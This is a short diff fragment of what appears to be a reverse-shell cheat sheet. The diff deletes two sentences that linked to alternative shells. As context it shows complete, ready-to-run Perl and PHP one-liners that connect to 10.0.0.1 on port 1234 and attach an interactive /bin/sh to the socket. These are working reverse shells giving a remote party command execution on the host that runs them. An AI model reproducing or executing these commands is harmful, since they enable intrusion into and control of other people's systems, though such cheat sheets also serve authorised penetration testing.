@@ -12,7 +12,7 @@ Here’s a shorter, feature-free version of the perl-reverse-shell:
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-There’s also an alternative PERL revere shell here.
+
 
 ## Python
 
@@ -30,7 +30,7 @@ This code assumes that the TCP connection uses file descriptor 3.  This worked o
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+
 
 ## Ruby
 
